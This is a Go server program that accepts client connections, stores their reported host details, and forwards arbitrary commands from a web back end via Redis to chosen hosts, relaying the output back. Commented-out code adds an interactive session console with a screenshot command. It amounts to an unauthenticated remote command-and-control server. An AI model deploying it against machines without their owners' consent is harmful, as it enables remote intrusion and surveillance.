package main

import (
    "flag"
    "fmt"
    "log"
    "net"
    "sync"
    "encoding/json"
    "github.com/mxi4oyu/MoonSocket/protocol"
    "github.com/gomodule/redigo/redis"
    _ "github.com/go-sql-driver/mysql"
    _ "../function"
    "code/socket-code/function"
    "strings"
    "regexp"
)

//const (
//    WHITE   = "\x1b[37;1m"
//    RED     = "\x1b[31;1m"
//    GREEN   = "\x1b[32;1m"
//    YELLOW  = "\x1b[33;1m"
//    BLUE    = "\x1b[34;1m"
//    MAGENTA = "\x1b[35;1m"
//    CYAN    = "\x1b[36;1m"
//    VERSION = "2.5.0"
//)

var (
    inputIP         = flag.String("IP", "0.0.0.0", "Listen IP")
    inputPort       = flag.String("PORT", "8848", "Listen Port")
    //counter         int                                       //用于会话计数，给map的key使用
    connlist        = make(map[string]net.Conn) //通过ip当做key存储所有连接的会话
    //connlistIPAddr  map[int]string   = make(map[int]string)   //存储所有IP地址，提供输入标识符显示
    lock                             = &sync.Mutex{}
    cmdinfo         = make(map[string]string)
    pcinfo          = make(map[string]string)

)

// ReadLine 函数等待命令行输入,返回字符串
//func ReadLine() string {
//    buf := bufio.NewReader(os.Stdin)
//    lin, _, err := buf.ReadLine()
//    if err != nil {
//        fmt.Println(RED, "[!] Error to Read Line!")
//    }
//    return string(lin)
//}

// Socket客户端连接处理程序,专用于接收消息处理
func connection(conn net.Conn) {
    defer conn.Close()
    //var clientid int
    clientip := conn.RemoteAddr().String()
    fmt.Println(conn.RemoteAddr().Network())
    add := strings.Split(clientip,":")
    lock.Lock()
    //counter++
    //clientid = counter
    connlist[add[0]] = conn
    //connlistIPAddr[counter] = clientip
    lock.Unlock()

    fmt.Printf("--- client: %s 连接成功 ---\n", clientip)
    function.InitPcInfo(clientip)
    tmpbuf:=make([] byte,0)
    buf:=make([] byte,1024)
    for {
        n,err:=conn.Read(buf)
        //如果客户端断开
        if err!=nil {
            conn.Close()
            delete(connlist, add[0])
            //delete(connlistIPAddr, clientid)
            fmt.Printf("--- client：%s 关闭 ---\n", clientip)
            //设置client下线
            function.OfflineClient(add[0])
            return
        }
        tmpbuf = protocol.Depack(append(tmpbuf,buf[:n]...))
        handClientMsg(add[0],string(tmpbuf))
    }
}



//处理client返回的信息
func handClientMsg(ip string,msg string){
    if msg == "❤❤❤❤❤❤" {
        //fmt.Println("接收到心跳消息")
    }else if msg[:1] == "{"{
        //这里将获取的主机信息存入数据库
        if err := json.Unmarshal([]byte(msg), &pcinfo); err == nil {
            fmt.Printf("接收到客户端的信息：%s",pcinfo)
            function.UpdatePcData(pcinfo)
        }
    }else {
        //这里打印执行完命令的返回值
        fmt.Printf("接收到客户端%s的信息:%s \n",ip,msg)
        //这里通过redis返回给beego
        publish(ip,msg)
    }
}
// 等待Socket 客户端连接
func handleConnWait() {
    l, err := net.Listen("tcp", *inputIP+":"+*inputPort)
    if err != nil {
        log.Fatal(err)
    }
    defer l.Close()
    for {
        conn, err := l.Accept()
        if err != nil {
            log.Fatal(err)
        }
        go connection(conn)

    }
}

// redis初始化连接
func newRedisclient() (conn redis.Conn, err error) {
    host := "127.0.0.1"
    port := "6379"
    adderss := host + ":" + port
    c, err := redis.Dial("tcp", adderss)
    return c, err
}

//订阅redis，接收来自beego的数据
func resolveOrderCreate(wait *sync.WaitGroup)  {
    defer wait.Done()
    conn, err := newRedisclient()
    if err != nil {
        return
    }
    client := redis.PubSubConn{conn}
    err = client.Subscribe("command")
    if err != nil {
        fmt.Println("订阅错误:", err)
        return
    }
    fmt.Println("等待订阅数据 ---->")
    for {
        switch v := client.Receive().(type){
        case redis.Message:
            fmt.Printf("收到来自%s订阅消息:%s", v.Channel, string(v.Data))
            handleRedisMsg(string(v.Data))
        case redis.Subscription:
            fmt.Println("Subscription", v.Channel, v.Kind, v.Count)
        }
    }
}

//发布redis把client的数据返回给beego
func publish (ip string,value string){
    reqinfo := make(map[string]string)
    reqinfo[ip] = value
    values,_ := json.Marshal(reqinfo)
    conn, err := newRedisclient()
    if err != nil {
        return
    }
    //value,_ := json.Marshal(cmdinfo)
    conn.Do("Publish", "result", values)
}

//从redis读取数据发送到client
func handleRedisMsg(info string){
    err:= json.Unmarshal([]byte(info), &cmdinfo)
    if err != nil {
        fmt.Println("string转map失败",err)
    }else {
        fmt.Println("收到命令------",cmdinfo)
        for key,value := range cmdinfo{
            fmt.Println(key,value)
            ips := handleData(key)
            fmt.Println(ips)
            fmt.Println(len(ips))
            if key != "" {
                for _,v := range ips{
                    _, ok := connlist[v];
                    if ok{
                        fmt.Printf("当前执行主机%s，命令%s \n",v,value)
                        sendMsgToClient(connlist[v], value)
                    } else{
                        fmt.Println("该主机未连接 \n")
                        function.OfflineClient(v)
                    }
                }
            }
            //运行后要把map里面的ip删除
            delete(cmdinfo, key)
        }
    }
}

func handleData(args string) []string{
    var ip_list         []string
    reg1 := regexp.MustCompile(`(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)`)
    ips := reg1.FindAll([]byte(args),-1)
    for _, value := range ips {
        ip_list = append(ip_list,string(value))
    }
    return ip_list
}

func main() {
    flag.Parse()
    go handleConnWait()
    var wg sync.WaitGroup
    wg.Add(1)
    go resolveOrderCreate(&wg)
    wg.Wait()
    //connid := 0
    //for {
    //    fmt.Print(RED, "SESSION ", connlistIPAddr[connid], WHITE, "> ")
    //    command := ReadLine()
    //    _conn, ok := connlist[connid]
    //    switch command {
    //    case "":
    //        // 如果输入为空，则什么都不做
    //    case "help":
    //        fmt.Println("")
    //        fmt.Println(CYAN, "-------------------------------------------------------")
    //        fmt.Println(CYAN, "session             选择在线的客户端")
    //        fmt.Println(CYAN, "exit                客户端下线")
    //        fmt.Println(CYAN, "quit                退出服务器端")
    //        fmt.Println(CYAN, "-------------------------------------------------------")
    //        fmt.Println("")
    //    case "session":
    //        fmt.Println(connlist)
    //        fmt.Print("选择客户端ID: ")
    //        inputid := ReadLine()
    //        if inputid != "" {
    //            var e error
    //            connid, e = strconv.Atoi(inputid)
    //            if e != nil {
    //                fmt.Println("请输入数字")
    //            } else if _, ok := connlist[connid]; ok {
    //                //如果输入并且存在客户端id
    //                //_cmd := base64.URLEncoding.EncodeToString([]byte("getos"))
    //                sendMsgToClient(connlist[connid],"cmd")
    //            }
    //        }
    //    case "exit":
    //        if ok {
    //            sendMsgToClient(_conn,"exit")
    //        }
    //    case "quit":
    //        os.Exit(0)
    //
    //    case "screenshot":
    //        if ok {
    //            sendMsgToClient(_conn,"screenshot")
    //        }
    //    default:
    //        if ok {
    //            sendMsgToClient(_conn,command)
    //        }
    //    }
    //}
}

//发送信息
func sendMsgToClient(conn net.Conn,msg string)  {
    //将信息封包
    smsg:=protocol.Enpack([]byte(msg))
    conn.Write(smsg)
}
